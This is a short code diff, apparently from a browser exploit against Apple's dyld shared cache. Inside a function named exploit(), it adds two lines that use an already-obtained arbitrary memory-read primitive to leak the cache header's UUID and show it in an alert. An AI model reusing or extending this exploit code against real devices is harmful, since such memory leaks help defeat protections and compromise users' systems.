@@ -581,6 +581,8 @@ function exploit(){
         }
 
         alert('dyld cache header @' + hdr);
+        var uuid = memory.readInt64(Add(hdr, 0x58)).lo();
+        alert("uuid: " + uuid)
         //var dcachedump = String.fromCharCode(...memory.copyfrom(hdr,0,100))
         
         function ab2str(buf) {
